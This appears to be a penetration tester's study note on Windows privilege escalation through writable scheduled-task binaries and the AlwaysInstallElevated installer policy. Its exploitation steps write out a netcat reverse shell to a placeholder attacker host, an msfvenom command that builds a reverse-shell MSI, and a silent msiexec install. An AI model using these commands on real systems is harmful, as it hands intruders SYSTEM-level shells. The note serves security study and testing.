---
title: "Scheduled Tasks & Installer Abuse"
created: 2026-03-11
updated: 2026-11-16
type: technique
tags: [privesc, technique, windows]
---

## Scheduled Tasks

Windows Task Scheduler can run programs or scripts at specified times or on events. If a scheduled task runs as a privileged user and references a binary you can modify or replace, that's a direct privesc vector.

### Enumeration

List all scheduled tasks:

```
schtasks /query /fo list /v
```

For a specific task:

```
schtasks /query /tn <taskname> /fo list /v
```

Key fields to check:
- **Task To Run** — the executable or script path
- **Run As User** — whose privileges it executes with

### Exploitation

Check if you can write to the binary:

```
icacls <task_to_run_path>
```

If `BUILTIN\Users` has `(F)` (full) or `(M)` (modify) permissions, replace the binary with a reverse shell:

```
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```

Then wait for the task to fire (or manually trigger if you have permissions):

```
schtasks /run /tn <taskname>
```

---

## AlwaysInstallElevated

When both of these registry values are set to `1`, any user can run `.msi` installer files with SYSTEM privileges — even unprivileged accounts.

### Check

Both must be set for exploitation to work:

```
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Look for `AlwaysInstallElevated REG_DWORD 0x1`.

### Exploitation

Generate a malicious MSI:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f msi -o malicious.msi
```

Transfer to target, then run silently:

```
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```

The `/quiet` and `/qn` flags suppress the installer UI. The payload executes with elevated privileges.

---

## Related Notes

- [[Windows Services]] — service-based privilege escalation
- [[Abusing Windows Privileges]] — dangerous privilege abuse (SeBackup, SeTakeOwnership, SeImpersonate)
